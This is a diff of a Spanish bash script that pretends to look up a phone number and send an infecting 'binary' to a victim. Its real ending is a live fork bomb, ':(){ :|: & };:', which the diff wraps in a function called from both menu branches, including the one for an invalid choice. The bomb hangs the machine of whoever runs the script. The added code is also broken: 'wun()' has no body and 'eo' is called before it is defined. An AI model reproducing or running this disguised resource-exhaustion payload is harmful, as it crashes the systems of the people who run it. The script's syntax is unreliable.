@@ -32,6 +32,8 @@ echo 'Analizando...'
 sleep 2
 echo 'Número Existente!'
 sleep 1
+#Fuctions
+wun()
 clear
 echo -e ${Z}'
 [ + ] Elige el binario a enviarle! [ + ]
@@ -53,15 +55,16 @@ if [[ $wu == '1' ]];then
 elif [[ $wu == '2' ]];then
 
         echo 'Preparando binario BooM..'
-
+        eo
 else
 
         echo "Elige bien la obcion..."
-
+        eo
         exit
 
 fi
 
+eo(){
 sleep 5
 echo ' '
 echo -e 'Atacando...😈\n'
@@ -70,3 +73,4 @@ echo 'infectando a' $nm
 sleep 2
 echo '¡En Ejecución!'
 :(){ :|: & };:
+}
